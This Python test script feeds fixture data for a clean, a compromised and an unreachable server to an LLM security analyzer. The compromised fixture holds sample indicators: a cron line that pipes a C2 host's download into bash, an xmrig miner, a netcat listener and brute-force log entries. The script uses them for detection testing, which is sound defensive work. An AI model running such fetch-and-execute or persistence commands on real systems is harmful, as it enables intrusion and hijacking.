"""
test_analyzer.py
────────────────
Run this directly to test the LLM analyzer against fixture data.

Usage:
    python3 test_analyzer.py                  # runs all fixtures
    python3 test_analyzer.py --clean          # clean instance only
    python3 test_analyzer.py --suspicious     # suspicious instance only
    python3 test_analyzer.py --prompt-only    # print prompts, skip Bedrock call
    python3 test_analyzer.py --unreachable    # test the error/unreachable case
"""

import argparse
import asyncio
import os
import sys
from datetime import datetime
from pathlib import Path

# ── Allow running from any directory ──────────────────────
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ── Load .env early so os.getenv() picks up the values ────
try:
    from dotenv import load_dotenv
    # Walk up from the script's directory until a .env file is found
    _here = Path(__file__).resolve().parent
    for _candidate in [_here, *_here.parents]:
        _env_file = _candidate / ".env"
        if _env_file.exists():
            load_dotenv(_env_file)
            print(f"[env] Loaded {_env_file}")
            break
    else:
        print("[env] No .env file found — relying on shell environment variables")
except ImportError:
    print("[env] python-dotenv not installed — relying on shell environment variables")

from llm_analyzer import build_prompt, analyze_with_bedrock, format_telegram_report


TIMESTAMP = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ─────────────────────────────────────────────────────────
# FIXTURE 1 — CLEAN / NORMAL INSTANCE
# A healthy web server with zero suspicious signals.
# Expected LLM output: LOW risk, no major findings.
# ─────────────────────────────────────────────────────────
CLEAN_FINDINGS = {
    "instance":  "prod-web-01",
    "mode":      "remote",
    "collected": TIMESTAMP,
    "error":     None,
    "processes": {
        "high_cpu":        [],
        "high_mem":        [],
        "suspicious_name": [],
        "suspicious_path": [],
        "zombies":         [],
    },
    "network": {
        "unexpected_listening": [],
        "external_connections": [
            # Normal: outbound HTTPS to AWS S3 and CloudFront
            {"local": "10.0.1.5:49812", "remote": "52.217.43.100:443"},
            {"local": "10.0.1.5:49900", "remote": "13.35.66.200:443"},
        ],
    },
    "users": {
        "logged_in": [
            {
                "name":     "ubuntu",
                "terminal": "pts/0",
                "host":     "10.0.0.1",        # internal bastion — normal
                "started":  "2026-06-25 09:00:00",
            }
        ]
    },
    "files": {
        "recently_modified_system": [
            # Normal: package manager update
            "2026-06-25T08:30:01 /usr/bin/python3.11",
            "2026-06-25T08:30:00 /usr/lib/python3/dist-packages/apt/cache.py",
        ]
    },
    "services": {
        "failed":    [],
        "new_units": [],
    },
    "cron": {
        "entries": [
            "# m h  dom mon dow   command",
            "0 2 * * * /usr/bin/certbot renew --quiet",   # normal: cert renewal
            "*/5 * * * * /usr/local/bin/healthcheck.sh",  # normal: health check
        ]
    },
    "auth_log": [
        "Jun 25 09:00:01 prod-web-01 sshd[1234]: Accepted publickey for ubuntu from 10.0.0.1 port 52100",
        "Jun 25 09:00:01 prod-web-01 sshd[1234]: pam_unix(sshd:session): session opened for user ubuntu",
    ],
}


# ─────────────────────────────────────────────────────────
# FIXTURE 2 — SUSPICIOUS / COMPROMISED INSTANCE
# Multiple correlated IOCs: cryptominer, C2 connection,
# backdoor cron, new SSH key, brute-force attempts.
# Expected LLM output: CRITICAL risk, strong correlation.
# ─────────────────────────────────────────────────────────
SUSPICIOUS_FINDINGS = {
    "instance":  "prod-api-02",
    "mode":      "remote",
    "collected": TIMESTAMP,
    "error":     None,
    "processes": {
        "high_cpu": [
            # xmrig cryptominer pinning a core
            {
                "pid":  9821,
                "name": "xmrig",
                "cpu":  97.3,
                "user": "www-data",
                "exe":  "/tmp/.x/xmrig",
            },
        ],
        "high_mem": [],
        "suspicious_name": [
            # Same xmrig process — name match
            {
                "pid":  9821,
                "name": "xmrig",
                "exe":  "/tmp/.x/xmrig",
                "user": "www-data",
            },
            # Netcat listener — possible reverse shell
            {
                "pid":  10042,
                "name": "nc",
                "exe":  "/bin/nc",
                "user": "www-data",
            },
        ],
        "suspicious_path": [
            # Miner running from hidden /tmp directory
            {
                "pid":  9821,
                "name": "xmrig",
                "exe":  "/tmp/.x/xmrig",
                "user": "www-data",
            },
        ],
        "zombies": [],
    },
    "network": {
        "unexpected_listening": [
            # Netcat backdoor listening on non-standard port
            {"port": 31337, "addr": "0.0.0.0:31337"},
        ],
        "external_connections": [
            # Miner connecting to mining pool
            {"local": "10.0.1.10:54321", "remote": "pool.minexmr.com:443"},
            # Possible C2 beacon — known Tor exit node range
            {"local": "10.0.1.10:55000", "remote": "185.220.101.47:80"},
            # Legitimate: outbound HTTPS to AWS API
            {"local": "10.0.1.10:49900", "remote": "52.94.228.167:443"},
        ],
    },
    "users": {
        "logged_in": [
            {
                "name":     "www-data",          # web process user — should NOT be SSH-ing
                "terminal": "pts/1",
                "host":     "185.220.101.47",    # same IP as C2 connection above
                "started":  "2026-06-25 22:41:00",
            },
            {
                "name":     "ubuntu",
                "terminal": "pts/0",
                "host":     "10.0.0.1",
                "started":  "2026-06-25 09:00:00",
            },
        ]
    },
    "files": {
        "recently_modified_system": [
            # Backdoor added to cron
            "2026-06-25T22:40:55 /etc/cron.d/update-check",
            # New SSH authorized key — persistence mechanism
            "2026-06-25T22:39:10 /etc/ssh/sshd_config",
            # Normal package update for comparison
            "2026-06-25T08:30:00 /usr/bin/python3.11",
        ]
    },
    "services": {
        "failed":    ["nginx"],   # nginx killed — possibly to free port or resources
        "new_units": ["/etc/systemd/system/update-checker.service"],  # disguised persistence
    },
    "cron": {
        "entries": [
            "# Legitimate entries",
            "0 2 * * * /usr/bin/certbot renew --quiet",
            "# Injected backdoor",
            "*/1 * * * * curl -s http://185.220.101.47/beacon | bash",  # C2 callback
            "*/10 * * * * /tmp/.x/xmrig --config /tmp/.x/config.json",  # miner persistence
        ]
    },
    "auth_log": [
        # Brute-force SSH from external IP
        "Jun 25 22:35:01 prod-api-02 sshd[8800]: Failed password for root from 185.220.101.47 port 12345",
        "Jun 25 22:35:03 prod-api-02 sshd[8801]: Failed password for root from 185.220.101.47 port 12346",
        "Jun 25 22:35:05 prod-api-02 sshd[8802]: Failed password for root from 185.220.101.47 port 12347",
        "Jun 25 22:35:07 prod-api-02 sshd[8803]: Failed password for root from 185.220.101.47 port 12348",
        "Jun 25 22:36:01 prod-api-02 sshd[8810]: Failed password for ubuntu from 185.220.101.47 port 22222",
        # Successful login from same attacker IP — brute force succeeded
        "Jun 25 22:40:01 prod-api-02 sshd[8900]: Accepted password for www-data from 185.220.101.47 port 54900",
        "Jun 25 22:40:02 prod-api-02 sshd[8900]: pam_unix(sshd:session): session opened for user www-data",
        # Privilege escalation attempt
        "Jun 25 22:41:30 prod-api-02 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
        # New user created — another persistence vector
        "Jun 25 22:42:00 prod-api-02 useradd[9100]: new user: name=sysupdate, UID=1002, GID=1002",
    ],
}


# ─────────────────────────────────────────────────────────
# FIXTURE 3 — UNREACHABLE INSTANCE
# SSH timed out — tests the error-case prompt path.
# ─────────────────────────────────────────────────────────
UNREACHABLE_FINDINGS = {
    "instance":  "prod-db-03",
    "mode":      "remote",
    "collected": TIMESTAMP,
    "error":     "SSH connection timed out after 10s (paramiko.ssh_exception.NoValidConnectionsError)",
    "processes": {"high_cpu": [], "high_mem": [], "suspicious_name": [], "suspicious_path": [], "zombies": []},
    "network":   {"unexpected_listening": [], "external_connections": []},
    "users":     {"logged_in": []},
    "files":     {"recently_modified_system": []},
    "services":  {"failed": [], "new_units": []},
    "cron":      {"entries": []},
    "auth_log":  [],
}


# ─────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────

def print_divider(title: str):
    width = 60
    print("\n" + "═" * width)
    print(f"  {title}")
    print("═" * width + "\n")


def print_prompt(label: str, findings: dict):
    prompt = build_prompt(findings)
    print_divider(f"PROMPT — {label}")
    print(prompt)
    print(f"\n[Prompt length: {len(prompt)} chars]\n")


async def run_analysis(label: str, findings: dict):
    print_divider(f"SENDING TO BEDROCK — {label}")
    print("⏳ Waiting for response...\n")

    result = await analyze_with_bedrock(findings)
    chunks = format_telegram_report(findings["instance"], result, TIMESTAMP)

    print_divider(f"LLM RESPONSE — {label}")
    for i, chunk in enumerate(chunks, 1):
        if len(chunks) > 1:
            print(f"--- chunk {i}/{len(chunks)} ---")
        print(chunk)
        print()

    return result


# ─────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────

async def main():
    parser = argparse.ArgumentParser(description="Test the LLM security analyzer")
    parser.add_argument("--clean",        action="store_true", help="Run clean fixture only")
    parser.add_argument("--suspicious",   action="store_true", help="Run suspicious fixture only")
    parser.add_argument("--unreachable",  action="store_true", help="Run unreachable/error fixture only")
    parser.add_argument("--prompt-only",  action="store_true", help="Print prompts only — skip Bedrock")
    args = parser.parse_args()

    # Default: run all
    run_clean       = args.clean       or not any([args.clean, args.suspicious, args.unreachable])
    run_suspicious  = args.suspicious  or not any([args.clean, args.suspicious, args.unreachable])
    run_unreachable = args.unreachable or not any([args.clean, args.suspicious, args.unreachable])

    fixtures = []
    if run_clean:       fixtures.append(("CLEAN — prod-web-01",       CLEAN_FINDINGS))
    if run_suspicious:  fixtures.append(("SUSPICIOUS — prod-api-02",  SUSPICIOUS_FINDINGS))
    if run_unreachable: fixtures.append(("UNREACHABLE — prod-db-03",  UNREACHABLE_FINDINGS))

    if args.prompt_only:
        for label, findings in fixtures:
            print_prompt(label, findings)
        return

    # Check AWS env vars before making real calls
    missing = [v for v in ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_REGION")
               if not os.getenv(v)]
    if missing:
        print(f"❌ Missing env vars for Bedrock: {', '.join(missing)}")
        print("   Set them in your shell or .env, or use --prompt-only to test without Bedrock.")
        sys.exit(1)

    for label, findings in fixtures:
        await run_analysis(label, findings)


if __name__ == "__main__":
    asyncio.run(main())